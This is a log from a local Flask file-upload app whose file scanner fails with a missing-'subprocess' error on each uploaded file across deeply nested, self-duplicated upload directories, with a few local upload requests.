2025-02-22 21:35:17,582 - Error scanning uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/mixed_cluster.bsv: name 'subprocess' is not defined
2025-02-22 21:35:17,583 - Error scanning uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/5.txt: name 'subprocess' is not defined
2025-02-22 21:35:17,584 - Error scanning uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/a.py: name 'subprocess' is not defined
2025-02-22 21:35:17,585 - Error scanning uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/metadata_analysis.py: name 'subprocess' is not defined
2025-02-22 21:35:17,586 - Error scanning uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/7-A.R: name 'subprocess' is not defined
2025-02-22 21:35:17,587 - Error scanning uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/input_detail.yaml: name 'subprocess' is not defined
2025-02-22 21:35:17,588 - Error scanning uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/5-A.R: name 'subprocess' is not defined
2025-02-22 21:35:17,589 - Error scanning uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/w.js: name 'subprocess' is not defined
2025-02-22 21:35:17,590 - Error scanning uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/2.xss: name 'subprocess' is not defined
2025-02-22 21:35:17,591 - Error scanning uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/6.js: name 'subprocess' is not defined
2025-02-22 21:35:17,592 - Error scanning uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/mixed_cluster.bsv: name 'subprocess' is not defined
2025-02-22 21:35:17,593 - Error scanning uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/5.txt: name 'subprocess' is not defined
2025-02-22 21:35:17,594 - Error scanning uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/a.py: name 'subprocess' is not defined
2025-02-22 21:35:17,595 - Error scanning uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/2.xss: name 'subprocess' is not defined
2025-02-22 21:35:17,596 - Error scanning uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/6.js: name 'subprocess' is not defined
2025-02-22 21:35:17,598 - Error scanning uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/5.txt: name 'subprocess' is not defined
2025-02-22 21:35:17,599 - Error scanning uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/new_test/new_test/HELLO.txt: name 'subprocess' is not defined
2025-02-22 21:35:17,600 - Error scanning uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/new_test/new_test/test_brute_force.txt: name 'subprocess' is not defined
2025-02-22 21:35:17,601 - Error scanning uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/2.xss: name 'subprocess' is not defined
2025-02-22 21:35:17,602 - Error scanning uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/6.js: name 'subprocess' is not defined
2025-02-22 21:35:17,603 - Error scanning uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/5.txt: name 'subprocess' is not defined
2025-02-22 21:35:17,604 - Error scanning uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/new_test/new_test/HELLO.txt: name 'subprocess' is not defined
2025-02-22 21:35:17,605 - Error scanning uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/new_test/new_test/test_brute_force.txt: name 'subprocess' is not defined
2025-02-22 21:35:17,606 - Error scanning uploads/flask_file_upload/flask_file_upload/uploads/test/test/2.xss: name 'subprocess' is not defined
2025-02-22 21:35:17,608 - Error scanning uploads/flask_file_upload/flask_file_upload/uploads/test/test/6.js: name 'subprocess' is not defined
2025-02-22 21:35:17,609 - Error scanning uploads/flask_file_upload/flask_file_upload/uploads/test/test/5.txt: name 'subprocess' is not defined
2025-02-22 21:35:17,610 - Error scanning uploads/flask_file_upload/flask_file_upload/uploads/new_test/new_test/HELLO.txt: name 'subprocess' is not defined
2025-02-22 21:35:17,612 - Error scanning uploads/flask_file_upload/flask_file_upload/uploads/new_test/new_test/test_brute_force.txt: name 'subprocess' is not defined
2025-02-22 21:35:17,613 - Error scanning uploads/flask_file_upload_2/flask_file_upload/metadata_analysis.py: name 'subprocess' is not defined
2025-02-22 21:35:17,615 - Error scanning uploads/flask_file_upload_2/flask_file_upload/trash/7-A.R: name 'subprocess' is not defined
2025-02-22 21:35:17,616 - Error scanning uploads/flask_file_upload_2/flask_file_upload/trash/input_detail.yaml: name 'subprocess' is not defined
2025-02-22 21:35:17,617 - Error scanning uploads/flask_file_upload_2/flask_file_upload/trash/5-A.R: name 'subprocess' is not defined
2025-02-22 21:35:17,619 - Error scanning uploads/flask_file_upload_2/flask_file_upload/trash/w.js: name 'subprocess' is not defined
2025-02-22 21:35:17,620 - Error scanning uploads/flask_file_upload_2/flask_file_upload/trash/2.xss: name 'subprocess' is not defined
2025-02-22 21:35:17,622 - Error scanning uploads/flask_file_upload_2/flask_file_upload/trash/6.js: name 'subprocess' is not defined
2025-02-22 21:35:17,623 - Error scanning uploads/flask_file_upload_2/flask_file_upload/trash/mixed_cluster.bsv: name 'subprocess' is not defined
2025-02-22 21:35:17,625 - Error scanning uploads/flask_file_upload_2/flask_file_upload/trash/5.txt: name 'subprocess' is not defined
2025-02-22 21:35:17,626 - Error scanning uploads/flask_file_upload_2/flask_file_upload/trash/a.py: name 'subprocess' is not defined
2025-02-22 21:35:17,628 - Error scanning uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/metadata_analysis.py: name 'subprocess' is not defined
2025-02-22 21:35:17,629 - Error scanning uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/7-A.R: name 'subprocess' is not defined
2025-02-22 21:35:17,630 - Error scanning uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/input_detail.yaml: name 'subprocess' is not defined
2025-02-22 21:35:17,632 - Error scanning uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/5-A.R: name 'subprocess' is not defined
2025-02-22 21:35:17,634 - Error scanning uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/w.js: name 'subprocess' is not defined
2025-02-22 21:35:17,636 - Error scanning uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/2.xss: name 'subprocess' is not defined
2025-02-22 21:35:17,637 - Error scanning uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/6.js: name 'subprocess' is not defined
2025-02-22 21:35:17,638 - Error scanning uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/mixed_cluster.bsv: name 'subprocess' is not defined
2025-02-22 21:35:17,640 - Error scanning uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/5.txt: name 'subprocess' is not defined
2025-02-22 21:35:17,641 - Error scanning uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/a.py: name 'subprocess' is not defined
2025-02-22 21:35:17,642 - Error scanning uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/metadata_analysis.py: name 'subprocess' is not defined
2025-02-22 21:35:17,644 - Error scanning uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/7-A.R: name 'subprocess' is not defined
2025-02-22 21:35:17,645 - Error scanning uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/input_detail.yaml: name 'subprocess' is not defined
2025-02-22 21:35:17,646 - Error scanning uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/5-A.R: name 'subprocess' is not defined
2025-02-22 21:35:17,648 - Error scanning uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/w.js: name 'subprocess' is not defined
2025-02-22 21:35:17,649 - Error scanning uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/2.xss: name 'subprocess' is not defined
2025-02-22 21:35:17,650 - Error scanning uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/6.js: name 'subprocess' is not defined
2025-02-22 21:35:17,652 - Error scanning uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/mixed_cluster.bsv: name 'subprocess' is not defined
2025-02-22 21:35:17,653 - Error scanning uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/5.txt: name 'subprocess' is not defined
2025-02-22 21:35:17,654 - Error scanning uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/a.py: name 'subprocess' is not defined
2025-02-22 21:35:17,656 - Error scanning uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/metadata_analysis.py: name 'subprocess' is not defined
2025-02-22 21:35:17,658 - Error scanning uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/7-A.R: name 'subprocess' is not defined
2025-02-22 21:35:17,659 - Error scanning uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/input_detail.yaml: name 'subprocess' is not defined
2025-02-22 21:35:17,660 - Error scanning uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/5-A.R: name 'subprocess' is not defined
2025-02-22 21:35:17,663 - Error scanning uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/w.js: name 'subprocess' is not defined
2025-02-22 21:35:17,665 - Error scanning uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/2.xss: name 'subprocess' is not defined
2025-02-22 21:35:17,667 - Error scanning uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/6.js: name 'subprocess' is not defined
2025-02-22 21:35:17,668 - Error scanning uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/mixed_cluster.bsv: name 'subprocess' is not defined
2025-02-22 21:35:17,669 - Error scanning uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/5.txt: name 'subprocess' is not defined
2025-02-22 21:35:17,671 - Error scanning uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/a.py: name 'subprocess' is not defined
2025-02-22 21:35:17,672 - Error scanning uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/2.xss: name 'subprocess' is not defined
2025-02-22 21:35:17,674 - Error scanning uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/6.js: name 'subprocess' is not defined
2025-02-22 21:35:17,675 - Error scanning uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/5.txt: name 'subprocess' is not defined
2025-02-22 21:35:17,677 - Error scanning uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/new_test/new_test/HELLO.txt: name 'subprocess' is not defined
2025-02-22 21:35:17,678 - Error scanning uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/new_test/new_test/test_brute_force.txt: name 'subprocess' is not defined
2025-02-22 21:35:17,680 - Error scanning uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/2.xss: name 'subprocess' is not defined
2025-02-22 21:35:17,681 - Error scanning uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/6.js: name 'subprocess' is not defined
2025-02-22 21:35:17,683 - Error scanning uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/5.txt: name 'subprocess' is not defined
2025-02-22 21:35:17,684 - Error scanning uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/new_test/new_test/HELLO.txt: name 'subprocess' is not defined
2025-02-22 21:35:17,686 - Error scanning uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/new_test/new_test/test_brute_force.txt: name 'subprocess' is not defined
2025-02-22 21:35:17,687 - Error scanning uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/2.xss: name 'subprocess' is not defined
2025-02-22 21:35:17,688 - Error scanning uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/6.js: name 'subprocess' is not defined
2025-02-22 21:35:17,690 - Error scanning uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/5.txt: name 'subprocess' is not defined
2025-02-22 21:35:17,691 - Error scanning uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/new_test/new_test/HELLO.txt: name 'subprocess' is not defined
2025-02-22 21:35:17,693 - Error scanning uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/new_test/new_test/test_brute_force.txt: name 'subprocess' is not defined
2025-02-22 21:35:17,694 - Error scanning uploads/flask_file_upload_2/flask_file_upload/uploads/test/test/2.xss: name 'subprocess' is not defined
2025-02-22 21:35:17,695 - Error scanning uploads/flask_file_upload_2/flask_file_upload/uploads/test/test/6.js: name 'subprocess' is not defined
2025-02-22 21:35:17,697 - Error scanning uploads/flask_file_upload_2/flask_file_upload/uploads/test/test/5.txt: name 'subprocess' is not defined
2025-02-22 21:35:17,698 - Error scanning uploads/flask_file_upload_2/flask_file_upload/uploads/new_test/new_test/HELLO.txt: name 'subprocess' is not defined
2025-02-22 21:35:17,699 - Error scanning uploads/flask_file_upload_2/flask_file_upload/uploads/new_test/new_test/test_brute_force.txt: name 'subprocess' is not defined
2025-02-22 21:35:17,701 - Error scanning uploads/test/test/2 (copy).yaml: name 'subprocess' is not defined
2025-02-22 21:35:17,702 - Error scanning uploads/test/test/2.xss: name 'subprocess' is not defined
2025-02-22 21:35:17,704 - Error scanning uploads/test/test/45.xml: name 'subprocess' is not defined
2025-02-22 21:35:17,705 - Error scanning uploads/test/test/6.js: name 'subprocess' is not defined
2025-02-22 21:35:17,706 - Error scanning uploads/test/test/5.txt: name 'subprocess' is not defined
2025-02-22 21:35:17,708 - Error scanning uploads/new_test/new_test/HELLO.txt: name 'subprocess' is not defined
2025-02-22 21:35:17,709 - Error scanning uploads/new_test/new_test/test_brute_force.txt: name 'subprocess' is not defined
2025-02-22 21:35:17,714 - [31m[1mWARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.[0m
 * Running on http://127.0.0.1:5000
2025-02-22 21:35:17,715 - [33mPress CTRL+C to quit[0m
2025-02-22 21:35:22,968 - 127.0.0.1 - - [22/Feb/2025 21:35:22] "GET / HTTP/1.1" 200 -
2025-02-22 21:35:28,027 - 127.0.0.1 - - [22/Feb/2025 21:35:28] "[32mPOST /upload HTTP/1.1[0m" 302 -
2025-02-22 21:35:28,033 - 127.0.0.1 - - [22/Feb/2025 21:35:28] "GET / HTTP/1.1" 200 -
2025-02-22 21:35:39,512 - 127.0.0.1 - - [22/Feb/2025 21:35:39] "[32mPOST /upload HTTP/1.1[0m" 302 -
2025-02-22 21:35:39,519 - 127.0.0.1 - - [22/Feb/2025 21:35:39] "GET / HTTP/1.1" 200 -
2025-02-22 21:35:39,989 - 127.0.0.1 - - [22/Feb/2025 21:35:39] "[32mPOST /upload HTTP/1.1[0m" 302 -
2025-02-22 21:35:39,998 - 127.0.0.1 - - [22/Feb/2025 21:35:39] "GET / HTTP/1.1" 200 -
2025-02-22 21:35:46,971 - 127.0.0.1 - - [22/Feb/2025 21:35:46] "[32mPOST /upload HTTP/1.1[0m" 302 -
2025-02-22 21:35:46,977 - 127.0.0.1 - - [22/Feb/2025 21:35:46] "GET / HTTP/1.1" 200 -
2025-02-22 21:36:40,674 - Error scanning uploads/alpha.jpg: name 'subprocess' is not defined
2025-02-22 21:36:40,675 - Error scanning uploads/flask_file_upload/flask_file_upload/metadata_analysis.py: name 'subprocess' is not defined
2025-02-22 21:36:40,676 - Error scanning uploads/flask_file_upload/flask_file_upload/trash/7-A.R: name 'subprocess' is not defined
2025-02-22 21:36:40,678 - Error scanning uploads/flask_file_upload/flask_file_upload/trash/input_detail.yaml: name 'subprocess' is not defined
2025-02-22 21:36:40,679 - Error scanning uploads/flask_file_upload/flask_file_upload/trash/5-A.R: name 'subprocess' is not defined
2025-02-22 21:36:40,680 - Error scanning uploads/flask_file_upload/flask_file_upload/trash/w.js: name 'subprocess' is not defined
2025-02-22 21:36:40,681 - Error scanning uploads/flask_file_upload/flask_file_upload/trash/2.xss: name 'subprocess' is not defined
2025-02-22 21:36:40,682 - Error scanning uploads/flask_file_upload/flask_file_upload/trash/6.js: name 'subprocess' is not defined
2025-02-22 21:36:40,684 - Error scanning uploads/flask_file_upload/flask_file_upload/trash/mixed_cluster.bsv: name 'subprocess' is not defined
2025-02-22 21:36:40,685 - Error scanning uploads/flask_file_upload/flask_file_upload/trash/5.txt: name 'subprocess' is not defined
2025-02-22 21:36:40,686 - Error scanning uploads/flask_file_upload/flask_file_upload/trash/a.py: name 'subprocess' is not defined
2025-02-22 21:36:40,687 - Error scanning uploads/flask_file_upload/flask_file_upload/uploads/alpha.jpg: name 'subprocess' is not defined
2025-02-22 21:36:40,689 - Error scanning uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/metadata_analysis.py: name 'subprocess' is not defined
2025-02-22 21:36:40,690 - Error scanning uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/7-A.R: name 'subprocess' is not defined
2025-02-22 21:36:40,691 - Error scanning uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/input_detail.yaml: name 'subprocess' is not defined
2025-02-22 21:36:40,692 - Error scanning uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/5-A.R: name 'subprocess' is not defined
2025-02-22 21:36:40,693 - Error scanning uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/w.js: name 'subprocess' is not defined
2025-02-22 21:36:40,694 - Error scanning uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/2.xss: name 'subprocess' is not defined
2025-02-22 21:36:40,695 - Error scanning uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/6.js: name 'subprocess' is not defined
2025-02-22 21:36:40,696 - Error scanning uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/mixed_cluster.bsv: name 'subprocess' is not defined
2025-02-22 21:36:40,697 - Error scanning uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/5.txt: name 'subprocess' is not defined
2025-02-22 21:36:40,698 - Error scanning uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/a.py: name 'subprocess' is not defined
2025-02-22 21:36:40,699 - Error scanning uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/alpha.jpg: name 'subprocess' is not defined
2025-02-22 21:36:40,700 - Error scanning uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/metadata_analysis.py: name 'subprocess' is not defined
2025-02-22 21:36:40,701 - Error scanning uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/7-A.R: name 'subprocess' is not defined
2025-02-22 21:36:40,702 - Error scanning uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/input_detail.yaml: name 'subprocess' is not defined
2025-02-22 21:36:40,703 - Error scanning uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/5-A.R: name 'subprocess' is not defined
2025-02-22 21:36:40,703 - Error scanning uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/w.js: name 'subprocess' is not defined
2025-02-22 21:36:40,704 - Error scanning uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/2.xss: name 'subprocess' is not defined
2025-02-22 21:36:40,705 - Error scanning uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/6.js: name 'subprocess' is not defined
2025-02-22 21:36:40,706 - Error scanning uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/mixed_cluster.bsv: name 'subprocess' is not defined
2025-02-22 21:36:40,707 - Error scanning uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/5.txt: name 'subprocess' is not defined
2025-02-22 21:36:40,708 - Error scanning uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/a.py: name 'subprocess' is not defined
2025-02-22 21:36:40,709 - Error scanning uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/alpha.jpg: name 'subprocess' is not defined
2025-02-22 21:36:40,710 - Error scanning uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/2.xss: name 'subprocess' is not defined
2025-02-22 21:36:40,711 - Error scanning uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/6.js: name 'subprocess' is not defined
2025-02-22 21:36:40,712 - Error scanning uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/5.txt: name 'subprocess' is not defined
2025-02-22 21:36:40,713 - Error scanning uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/new_test/new_test/HELLO.txt: name 'subprocess' is not defined
2025-02-22 21:36:40,714 - Error scanning uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/new_test/new_test/test_brute_force.txt: name 'subprocess' is not defined
2025-02-22 21:36:40,715 - Error scanning uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/2.xss: name 'subprocess' is not defined
2025-02-22 21:36:40,716 - Error scanning uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/6.js: name 'subprocess' is not defined
2025-02-22 21:36:40,717 - Error scanning uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/5.txt: name 'subprocess' is not defined
2025-02-22 21:36:40,718 - Error scanning uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/new_test/new_test/HELLO.txt: name 'subprocess' is not defined
2025-02-22 21:36:40,719 - Error scanning uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/new_test/new_test/test_brute_force.txt: name 'subprocess' is not defined
2025-02-22 21:36:40,720 - Error scanning uploads/flask_file_upload/flask_file_upload/uploads/test/test/2.xss: name 'subprocess' is not defined
2025-02-22 21:36:40,721 - Error scanning uploads/flask_file_upload/flask_file_upload/uploads/test/test/6.js: name 'subprocess' is not defined
2025-02-22 21:36:40,722 - Error scanning uploads/flask_file_upload/flask_file_upload/uploads/test/test/5.txt: name 'subprocess' is not defined
2025-02-22 21:36:40,723 - Error scanning uploads/flask_file_upload/flask_file_upload/uploads/new_test/new_test/HELLO.txt: name 'subprocess' is not defined
2025-02-22 21:36:40,724 - Error scanning uploads/flask_file_upload/flask_file_upload/uploads/new_test/new_test/test_brute_force.txt: name 'subprocess' is not defined
2025-02-22 21:36:40,725 - Error scanning uploads/flask_file_upload_2/flask_file_upload/metadata_analysis.py: name 'subprocess' is not defined
2025-02-22 21:36:40,726 - Error scanning uploads/flask_file_upload_2/flask_file_upload/trash/7-A.R: name 'subprocess' is not defined
2025-02-22 21:36:40,727 - Error scanning uploads/flask_file_upload_2/flask_file_upload/trash/input_detail.yaml: name 'subprocess' is not defined
2025-02-22 21:36:40,728 - Error scanning uploads/flask_file_upload_2/flask_file_upload/trash/5-A.R: name 'subprocess' is not defined
2025-02-22 21:36:40,729 - Error scanning uploads/flask_file_upload_2/flask_file_upload/trash/w.js: name 'subprocess' is not defined
2025-02-22 21:36:40,729 - Error scanning uploads/flask_file_upload_2/flask_file_upload/trash/2.xss: name 'subprocess' is not defined
2025-02-22 21:36:40,730 - Error scanning uploads/flask_file_upload_2/flask_file_upload/trash/6.js: name 'subprocess' is not defined
2025-02-22 21:36:40,731 - Error scanning uploads/flask_file_upload_2/flask_file_upload/trash/mixed_cluster.bsv: name 'subprocess' is not defined
2025-02-22 21:36:40,732 - Error scanning uploads/flask_file_upload_2/flask_file_upload/trash/5.txt: name 'subprocess' is not defined
2025-02-22 21:36:40,733 - Error scanning uploads/flask_file_upload_2/flask_file_upload/trash/a.py: name 'subprocess' is not defined
2025-02-22 21:36:40,734 - Error scanning uploads/flask_file_upload_2/flask_file_upload/uploads/alpha.jpg: name 'subprocess' is not defined
2025-02-22 21:36:40,735 - Error scanning uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/metadata_analysis.py: name 'subprocess' is not defined
2025-02-22 21:36:40,736 - Error scanning uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/7-A.R: name 'subprocess' is not defined
2025-02-22 21:36:40,737 - Error scanning uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/input_detail.yaml: name 'subprocess' is not defined
2025-02-22 21:36:40,738 - Error scanning uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/5-A.R: name 'subprocess' is not defined
2025-02-22 21:36:40,739 - Error scanning uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/w.js: name 'subprocess' is not defined
2025-02-22 21:36:40,740 - Error scanning uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/2.xss: name 'subprocess' is not defined
2025-02-22 21:36:40,741 - Error scanning uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/6.js: name 'subprocess' is not defined
